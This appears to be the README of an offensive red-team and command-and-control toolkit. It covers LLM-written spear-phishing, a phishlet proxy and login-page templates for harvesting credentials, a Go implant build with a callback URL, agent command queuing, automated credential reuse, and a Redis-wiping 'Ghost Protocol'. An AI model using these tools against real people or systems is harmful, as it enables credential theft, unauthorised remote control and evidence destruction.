# VANTABLACK

**VANTABLACK is a next-generation, automated offensive security platform (Red Team & C2).**

It combines an intelligent phishing engine, a stealthy Go-based C2 implant, and AI-driven post-exploitation capabilities to create a comprehensive and highly effective offensive toolkit.

---

## ⚡ Core Features

- **🤖 AI-Powered Phishing**: Leverages local LLMs (via Ollama) to generate hyper-personalized spear-phishing emails, increasing engagement success rates.
- **👻 Stealthy C2 Implant**: A lightweight, cross-platform C2 agent (`gohorse`) written in Go, featuring end-to-end encrypted communication (AES-GCM).
- **🧠 Automated Post-Exploitation**: Utilizes Celery workers to automate complex post-exploitation tasks, such as credential reuse and objective-driven actions.
- **🌐 Dynamic Infrastructure**: Designed to work with Terraform for dynamic deployment and teardown of attack infrastructure (future goal).
- **🛡️ Secure by Design**: Features a scope-based access control system, security headers, and a "Ghost Protocol" for rapid data sanitization.
- **🔧 Developer-Friendly**: Comes with a `Makefile` for simplified service management and a built-in performance profiler.

---

## 🚀 Getting Started

### Prerequisites

- Python 3.9+
- Go 1.18+
- Node.js >=16.0.0
- npm >=8.0.0
- Redis
- Ollama with a running LLM (e.g., `llama3`)

### Installation

1.  **Clone the repository:**
    ```bash
    git clone https://github.com/thesenegalesehitch/Vantablack-evilginx-core-.git
    cd Vantablack-evilginx-core-
    ```

2.  **Install Python dependencies:**
    ```bash
    make install
    ```

### Running the Platform

You can run all services (API and workers) in parallel using the `Makefile`:

```bash
make run-all
```

Alternatively, you can run services individually:

- **Run the API server:**
  ```bash
  make run-api
  ```
- **Run all Celery workers:**
  ```bash
  make run-workers
  ```

To stop all running workers:
```bash
make stop-workers
```

---

## 🛠️ Usage

### Interactive CLI Menu (EN/FR)

Start the bilingual interactive menu:

```bash
python3 vanta.py
```

Menu options:
- List Features
- Start Services (API + Frontend)
- Open API Docs
- Configuration
- Logs Access
- Language Switch (EN / FR)
- Ghost Protocol
- Quishing Generator
- Generate Report
- Exit

Basculer la langue dynamiquement via “Language Switch”.

### Building the C2 Implant

The `gohorse` implant must be compiled for your target architecture. The build script injects the C2 callback URL, a unique agent ID, and an encryption key.

```bash
cd agents/gohorse

# Generate a secure 32-byte encryption key
ENCRYPTION_KEY=$(openssl rand -hex 16)

# Build the agent
./build.sh <agent-id> <c2-url> $ENCRYPTION_KEY

# Example:
./build.sh agent-001 http://127.0.0.1:8000/c2/implant/callback $ENCRYPTION_KEY
```

The compiled binaries will be placed in the `bin/` directory at the project root.

### Interacting with the API

The API is documented using OpenAPI (Swagger UI) and can be accessed at `/docs` when the API server is running.

- **Queue a task for an agent:**
  ```bash
  POST /c2/task/queue
  Content-Type: application/json

  {
    "agent_id": "agent-001",
    "command": "whoami"
  }
  ```

- **Trigger the Ghost Protocol (requires `system:admin` scope):**
  ```bash
  POST /system/ghost-protocol
  ```

---

## 🏛️ Architecture

- **FastAPI Server (`api/`)**: REST API, WebSocket support, authentication, rate limiting, integrations.
- **Frontend (`web/frontend/`)**: React-based dashboard.
- **Templates (`templates/`)**: Generation, optimization, marketplace, A/B testing.
- **Analysis (`analysis/`)**: Behavioral, mutation, reverse engineering toolchains.
- **Workers (`workers/`)**: Celery tasks (OSINT, credential reuse, objectives, ghost protocol).
- **Agents (`agents/gohorse/`)**: Go-based C2 implant.
- **Core (`core/`)**: Configuration and shared infrastructure.

---

## 👻 Ghost Protocol

The Ghost Protocol is a critical security feature designed to rapidly sanitize the system in case of compromise. When triggered via the `/system/ghost-protocol` endpoint, it initiates a background task that performs the following actions:

- **Wipes the Redis database**: This immediately deletes all task queues, results, session data, and cached information.
- (Future) Deletes log files and other sensitive artifacts.

This is a one-way, destructive action.

---

## ⚡ Performance Profiling

VANTABLACK includes a built-in performance profiling middleware that logs the processing time for every API request. This provides real-time insights into the performance of each endpoint.

**How it works:**
- A FastAPI middleware automatically intercepts all incoming requests.
- It calculates the total processing time in milliseconds.
- The result is logged to the console with the `[PROFILE]` tag, e.g., `[PROFILE] Request GET /system/status completed in 5.43ms`.

This allows for easy identification of slow endpoints and performance bottlenecks.

---

## 🔒 Security Considerations

- Change `SECRET_KEY` and `C2_DEFAULT_ENCRYPTION_KEY` via environment variables or `.env`.
- Restrict CORS and scopes in production.
- Store logs securely; consider file-based logging for audits.
- Run behind TLS and a reverse proxy.

---

## 🇫🇷 Section Française — Menu et Démarrage

Lancer le menu interactif bilingue :

```bash
python3 vanta.py
```

Fonctionnalités du menu :
- Lister les fonctionnalités
- Démarrer les services (API + Frontend)
- Ouvrir la documentation API
- Configuration
- Accès aux logs
- Changer la langue (EN / FR)
- Ghost Protocol
- Générateur Quishing
- Générer le rapport
- Quitter

---

## 🧩 Troubleshooting

- API not reachable:
  - Ensure Python dependencies are installed: `make install`.
  - Start the API via menu or `make run-api`.
  - Check port conflicts on `8000`.
- Frontend not starting:
  - Install Node dependencies in `web/frontend`: `npm install`.
  - Use `npm start` inside `web/frontend`.
- Redis connection errors:
  - Verify Redis is running locally or update `REDIS_URL`.
- Permission errors on Ghost Protocol:
  - Requires `system:admin` scope and admin role.

---

## 🌿 Branching Strategy

- Create a dedicated branch per task.
- Use atomic commits with Conventional Commits.
- Merge with `--no-ff` and delete the feature branch.
- Example:
  - `git checkout -b feat/interactive-menu`
  - `git commit -m "feat: add bilingual interactive CLI menu\n\nCo-authored-by: ChatGPT <chatgpt@openai.com>"`
  - `git checkout main && git merge feat/interactive-menu --no-ff && git branch -d feat/interactive-menu`
  - `git push origin main`

---

## 🛡️ Security Model

- Authentication via scoped tokens; bearer auth enforced.
- Rate limiting per endpoint and user with Redis.
- Security headers enabled globally (X-Frame-Options, X-XSS-Protection, CSP).
- Ghost Protocol for data sanitization.
- CORS restricted via configuration.
- TLS startup supported via configuration.
- Secrets loaded from environment via Pydantic Settings.

---

## 🌐 WAN Deployment Guide

- Configure `PUBLIC_BASE_URL`, `ENABLE_TLS`, `TLS_CERT_PATH`, `TLS_KEY_PATH` in environment.
- Run API with TLS via `vanta.py` menu or `make run-api`.
- Place behind a reverse proxy (Nginx/Caddy) with strict CORS and headers.
- Use `docker-compose` to expose ports 8000 (API), 8080 (proxy), 3000 (web).
- Harden exposure: limit origins, restrict scopes, enforce admin-only sensitive endpoints.

---

## 🧰 Template System Documentation

- Module: `templates/` with generator, optimizer, marketplace, CLI.
- CLI entry: `templates/cli.py`.
- Generate templates:
  - `python templates/cli.py generate --platform twitter --type login --responsive --count 1`
- Optimize templates:
  - `python templates/cli.py optimize --template <id> --goal conversion_rate --variants 4`

---

## 🐟 Phishlet System Documentation

- Phishlets located in `phishlets/`.
- Proxy engine: `engine/proxy.py` using `PHISHLET` env var.
- Start proxy:
  - `PHISHLET=phishlets/twitter.yaml python engine/proxy.py`
- Analyze phishlet:
  - `python analysis/reverse_engineer/cli.py analyze phishlets/twitter.yaml --format json`

---

## 🤝 Contribution Guide

- Fork and create feature branches per task.
- Follow Conventional Commits.
- Write tests for new features and modules.
- Keep code in English; documentation bilingual where relevant.
- Ensure secrets are never committed; use environment variables.

---

## 🧭 Git Workflow Explanation

- main: stable branch; only merged via `--no-ff`.
- feat/*, fix/*, docs/* branches for tasks.
- Atomic commits with co-author attribution.
- CI recommended to run lint, typecheck, and tests.
